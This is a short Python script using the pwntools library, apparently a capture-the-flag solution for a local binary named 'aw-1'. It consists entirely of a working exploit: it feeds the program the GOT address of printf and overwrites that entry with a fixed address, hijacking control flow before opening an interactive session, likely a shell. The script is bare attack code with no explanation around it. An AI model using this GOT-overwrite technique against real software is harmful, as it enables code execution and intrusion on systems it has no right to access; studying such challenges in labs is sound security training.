#!/usr/bin/env python

from pwn import *

p = process("./aw-1")

print(p.recv())

p.sendline("8")
p.sendline(hex(p.elf.got['printf']))

p.sendline(p64(0x400851))

p.interactive()
